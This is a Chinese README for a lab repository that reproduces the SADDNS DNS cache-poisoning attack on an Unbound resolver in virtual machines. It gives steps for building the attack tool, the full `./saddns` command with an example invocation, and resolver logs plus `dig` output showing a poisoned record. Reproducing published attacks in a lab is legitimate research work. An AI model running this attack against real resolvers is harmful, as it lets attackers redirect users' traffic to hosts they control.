# saddns-vm
## 说明
本仓库环境用于虚拟机环境复现SADDNS攻击(Unbound环境)

## 环境搭建
访问[云盘地址](https://pan.baidu.com/s/1D7cZroTt73PcIcVBMX-jnw?pwd=5aip)获取`saddns-server`和`server.py`的虚拟机镜像

- 使用PVE系统，直接上传两个镜像备份，然后点击`restore`即可恢复
- 使用VMvare等使用`.vmdk`格式的镜像，参见[该工具](https://github.com/astroicers/zst2vmdk)将`.vma.zst`转为`.vmdk`

`attacker`
- 任意Linux虚拟机
  ```shell
  sudo apt update
  sudo apt install build-essential libuv1-dev pkg-config git
  # ...可以配置git

  git clone git@github.com:Kie-Chi/Cpings.git
  # 若阻挡udp流量，可以尝试http/https，或者配置主机ssh.github.com
  cd Cpings
  ./build.sh
  cd build
  ```

`saddns-server`
- 修改`/usr/local/etc/unbound/unbound.conf`中，`example.com`的指向

`auth-server`
- 运行`server.py`脚本充当权威服务器
  ```shell
  sudo apt update
  sudo apt install python3 python3-dnslib
  python3 server.py
  ```

## 实验复现

- 运行受害者递归解析器
  ```shell
  sudo unbound -d
  # 若失败，可以尝试关掉systmd-resolve
  ```

- 攻击递归解析器
  ```shell
  ./saddns  -i VICTIM_IP \
            -o VICTIM_IP \
            -s FAKE_IP  \
            -u AUTH_IP  \
            -d POISON_DOMAIN    \
            -a POISON_IP    \
            -v
  ```
  - `VICTIM_IP`: 受害者递归解析器的IP地址
  - `FAKE_IP`: 当前子网下任意不存在IP地址
  - `AUTH_IP`: 权威服务器的IP地址
  - `POISON_DOMAIN`: 需要投毒的域名
  - `POISON_IP`: 需要投毒的IP
  - e.g. `./saddns -i 192.168.3.144 -o 192.168.3.144 -s 192.168.3.111 -u 192.168.3.135 -d vic.example.com -a 192.168.3.148 -v`

- 观察受害者递归解析器
  ```shell
    [1755165673] unbound[1828:0] debug: answer cb
    [1755165673] unbound[1828:0] debug: Incoming reply id = f5a9
    [1755165673] unbound[1828:0] debug: Incoming reply addr = ip4 192.168.3.135 port 53 (len 16)
    [1755165673] unbound[1828:0] debug: lookup size is 1 entries
    [1755165673] unbound[1828:0] debug: received unwanted or unsolicited udp reply dropped.
    [1755165673] unbound[1828:0] debug: dropped message[114:0] F5A98410000100010001000103766963076578616D706C6503636F6D000001000103766963076578616D706C6503636F6D00000100010000FFFF0004C0A8039003766963076578616D706C6503636F6D00000200010000FFFF000C03646E7306676F6F676C65000000291000000080000000
    [1755165673] unbound[1828:0] debug: answer cb
    [1755165673] unbound[1828:0] debug: Incoming reply id = f5aa
    [1755165673] unbound[1828:0] debug: Incoming reply addr = ip4 192.168.3.135 port 53 (len 16)
    [1755165673] unbound[1828:0] debug: lookup size is 1 entries
    [1755165673] unbound[1828:0] debug: received udp reply.
    [1755165673] unbound[1828:0] debug: udp message[114:0] F5AA8410000100010001000103766963076578616D706C6503636F6D000001000103766963076578616D706C6503636F6D00000100010000FFFF0004C0A8039003766963076578616D706C6503636F6D00000200010000FFFF000C03646E7306676F6F676C65000000291000000080000000
    [1755165673] unbound[1828:0] debug: outnet handle udp reply
    [1755165673] unbound[1828:0] debug: serviced query: EDNS works for ip4 192.168.3.135 port 53 (len 16)
    [1755165673] unbound[1828:0] debug: measured roundtrip at 16007 msec
    [1755165673] unbound[1828:0] debug: svcd callbacks start
    [1755165673] unbound[1828:0] debug: worker svcd callback for qstate 0x55f1392e4f20
    [1755165673] unbound[1828:0] debug: mesh_run: start
    [1755165673] unbound[1828:0] debug: iterator[module 1] operate: extstate:module_wait_reply event:module_event_reply
    [1755165673] unbound[1828:0] info: iterator operate: query vic.example.com. A IN
    [1755165673] unbound[1828:0] debug: process_response: new external response event
    [1755165673] unbound[1828:0] info: scrub for example.com. NS IN
    [1755165673] unbound[1828:0] info: response for vic.example.com. A IN
    [1755165673] unbound[1828:0] info: reply from <example.com.> 192.168.3.135#53
    [1755165673] unbound[1828:0] info: incoming scrubbed packet: ;; ->>HEADER<<- opcode: QUERY, rcode: NOERROR, id: 0
    ;; flags: qr aa ; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
    ;; QUESTION SECTION:
    vic.example.com.        IN      A

    ;; ANSWER SECTION:
    vic.example.com.        65535   IN      A       192.168.3.148

    ;; AUTHORITY SECTION:
    vic.example.com.        65535   IN      NS      dns.google.

    ;; ADDITIONAL SECTION:
    ;; MSG SIZE  rcvd: 73

    [1755165673] unbound[1828:0] debug: iter_handle processing q with state QUERY RESPONSE STATE
    [1755165673] unbound[1828:0] info: query response was ANSWER
    [1755165673] unbound[1828:0] debug: iter_handle processing q with state FINISHED RESPONSE STATE
    [1755165673] unbound[1828:0] info: finishing processing for vic.example.com. A IN
    [1755165673] unbound[1828:0] debug: mesh_run: iterator module exit state is module_finished
    [1755165673] unbound[1828:0] debug: validator[module 0] operate: extstate:module_wait_module event:module_event_moddone
    [1755165673] unbound[1828:0] info: validator operate: query vic.example.com. A IN
    [1755165673] unbound[1828:0] debug: validator: nextmodule returned
    [1755165673] unbound[1828:0] debug: val handle processing q with state VAL_INIT_STATE
    [1755165673] unbound[1828:0] debug: validator classification positive
    [1755165673] unbound[1828:0] info: no signer, using vic.example.com. TYPE0 CLASS0
    [1755165673] unbound[1828:0] debug: val handle processing q with state VAL_FINISHED_STATE
    [1755165673] unbound[1828:0] debug: mesh_run: validator module exit state is module_finished
    [1755165673] unbound[1828:0] debug: query took 16.007186 sec
    [1755165673] unbound[1828:0] info: mesh_run: end 0 recursion states (0 with reply, 0 detached), 0 waiting replies, 1 recursion replies sent, 0 replies dropped, 0 states jostled out
    [1755165673] unbound[1828:0] info: average recursion processing time 16.007186 sec
    [1755165673] unbound[1828:0] info: histogram of recursion processing times
    [1755165673] unbound[1828:0] info: [25%]=0 median[50%]=0 [75%]=0
    [1755165673] unbound[1828:0] info: lower(secs) upper(secs) recursions
    [1755165673] unbound[1828:0] info:   16.000000   32.000000 1
    [1755165673] unbound[1828:0] debug: cache memory msg=66353 rrset=66558 infra=8117 val=66352
    [1755165673] unbound[1828:0] debug: svcd callbacks end
    [1755165673] unbound[1828:0] debug: close of port 41904
    [1755165673] unbound[1828:0] debug: close fd 7
  ```

- 再次验证，是否投毒成功
  ```shell
    dig @<VICTIM_IP> POISON_DOMAIN

    ;; ->>HEADER<<- opcode: QUERY, rcode: NOERROR, id: 0
    ;; flags: qr aa ; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
    ;; QUESTION SECTION:
    vic.example.com.        IN      A

    ;; ANSWER SECTION:
    vic.example.com.        65521   IN      A       192.168.3.148

    ;; AUTHORITY SECTION:
    vic.example.com.        65521   IN      NS      dns.google.

    ;; ADDITIONAL SECTION:
    ;; MSG SIZE  rcvd: 73
  ```

